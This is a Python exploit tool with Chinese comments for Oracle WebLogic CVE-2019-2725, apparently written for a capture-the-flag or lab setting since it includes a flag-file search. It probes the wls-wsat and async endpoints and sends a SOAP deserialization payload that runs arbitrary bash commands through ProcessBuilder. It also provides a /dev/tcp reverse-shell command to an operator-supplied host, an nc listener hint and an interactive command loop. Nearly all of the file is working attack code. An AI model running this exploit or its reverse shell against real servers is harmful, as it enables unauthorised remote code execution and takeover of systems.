#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebLogic CVE-2019-2725 专用利用脚本
基于实际测试结果优化，支持漏洞检测、命令执行、反向shell等功能
"""

import requests
import sys
import argparse
import time
import socket
import threading

class WebLogicCVE2019_2725Exploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        
        # 攻击路径
        self.wsat_path = "/wls-wsat/CoordinatorPortType"
        self.async_path = "/_async/AsyncResponseService"
        
        # HTTP头
        self.headers = {
            'Content-Type': 'text/xml; charset=UTF-8',
            'SOAPAction': '',
            'User-Agent': 'Mozilla/5.0 (compatible; CVE-2019-2725-PoC)'
        }
    
    def test_vulnerability(self):
        """测试漏洞是否存在"""
        print(f"[*] 测试目标: {self.target_url}")
        
        # 检测wls-wsat组件
        wsat_url = f"{self.target_url}{self.wsat_path}"
        try:
            response = self.session.get(wsat_url, timeout=10)
            print(f"[+] wls-wsat组件状态: {response.status_code}")
            if response.status_code in [200, 500]:
                print("[+] wls-wsat组件可访问，存在CVE-2019-2725漏洞风险")
                return True
        except Exception as e:
            print(f"[-] wls-wsat组件测试失败: {e}")
        
        # 检测async组件
        async_url = f"{self.target_url}{self.async_path}"
        try:
            response = self.session.get(async_url, timeout=10)
            print(f"[+] async组件状态: {response.status_code}")
            if response.status_code in [200, 500]:
                print("[+] async组件可访问，存在CVE-2019-2725漏洞风险")
                return True
        except Exception as e:
            print(f"[-] async组件测试失败: {e}")
        
        return False
    
    def execute_command(self, command, attack_path=None):
        """执行系统命令"""
        if attack_path is None:
            attack_path = self.wsat_path
        
        # 构造恶意SOAP载荷
        soap_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <object class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>{command}</string>
                        </void>
                    </array>
                    <void method="start"/>
                </object>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>"""
        
        attack_url = f"{self.target_url}{attack_path}"
        
        try:
            print(f"[*] 攻击目标: {attack_url}")
            print(f"[*] 执行命令: {command}")
            
            response = self.session.post(
                attack_url,
                data=soap_payload,
                headers=self.headers,
                timeout=15
            )
            
            print(f"[+] HTTP状态码: {response.status_code}")
            print(f"[+] 响应长度: {len(response.text)} 字节")
            
            if response.status_code == 500:
                print("[+] 攻击成功 (HTTP 500表示反序列化触发)")
                return True
            elif response.status_code == 200:
                print("[+] 请求被处理 (需要进一步验证)")
                return True
            else:
                print(f"[-] 攻击失败，状态码: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] 攻击执行失败: {e}")
            return False
    
    def get_reverse_shell(self, lhost, lport):
        """获取反向shell"""
        print(f"[*] 尝试获取反向shell: {lhost}:{lport}")
        
        # 反向shell命令
        reverse_shell_cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        
        print(f"[*] 反向shell命令: {reverse_shell_cmd}")
        print(f"[!] 请确保在 {lhost}:{lport} 上运行: nc -lvnp {lport}")
        
        return self.execute_command(reverse_shell_cmd)
    
    def search_flags(self):
        """搜索flag文件"""
        print("[*] 开始搜索flag文件...")
        
        flag_commands = [
            "find / -name '*flag*' 2>/dev/null",
            "find / -name 'flag*' 2>/dev/null", 
            "find / -name '*flag.txt' 2>/dev/null",
            "find /tmp -name '*flag*' 2>/dev/null",
            "find /var -name '*flag*' 2>/dev/null",
            "find /home -name '*flag*' 2>/dev/null",
            "ls -la /flag* 2>/dev/null",
            "ls -la /tmp/flag* 2>/dev/null",
            "cat /flag 2>/dev/null",
            "cat /tmp/flag* 2>/dev/null"
        ]
        
        for cmd in flag_commands:
            print(f"\n[*] 执行: {cmd}")
            self.execute_command(cmd)
            time.sleep(1)
    
    def interactive_shell(self):
        """交互式shell"""
        print("[*] 进入交互式shell模式")
        print("[*] 输入 'exit' 退出")
        
        while True:
            try:
                command = input("WebLogic-Shell> ").strip()
                if command.lower() in ['exit', 'quit']:
                    print("[*] 退出交互式shell")
                    break
                elif command:
                    self.execute_command(command)
                    print()
            except KeyboardInterrupt:
                print("\n[*] 退出交互式shell")
                break
            except EOFError:
                print("\n[*] 退出交互式shell")
                break

def main():
    parser = argparse.ArgumentParser(description='WebLogic CVE-2019-2725 利用工具')
    parser.add_argument('-t', '--target', required=True, help='目标URL (例如: http://10.37.133.3:7001)')
    parser.add_argument('-c', '--command', help='要执行的命令')
    parser.add_argument('-v', '--verify', action='store_true', help='仅验证漏洞存在性')
    parser.add_argument('-r', '--reverse', nargs=2, metavar=('HOST', 'PORT'), help='获取反向shell')
    parser.add_argument('-f', '--find-flag', action='store_true', help='搜索flag文件')
    parser.add_argument('-i', '--interactive', action='store_true', help='交互式shell')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("WebLogic CVE-2019-2725 利用工具")
    print("基于Oracle安全公告和实际测试优化")
    print("=" * 60)
    
    exploit = WebLogicCVE2019_2725Exploit(args.target)
    
    if args.verify:
        print("[*] 开始漏洞验证...")
        if exploit.test_vulnerability():
            print("[+] 目标存在CVE-2019-2725漏洞")
        else:
            print("[-] 目标不存在CVE-2019-2725漏洞")
    
    if args.command:
        print("[*] 开始命令执行...")
        exploit.execute_command(args.command)
    
    if args.reverse:
        lhost, lport = args.reverse
        exploit.get_reverse_shell(lhost, lport)
    
    if args.find_flag:
        exploit.search_flags()
    
    if args.interactive:
        exploit.interactive_shell()

if __name__ == "__main__":
    main() 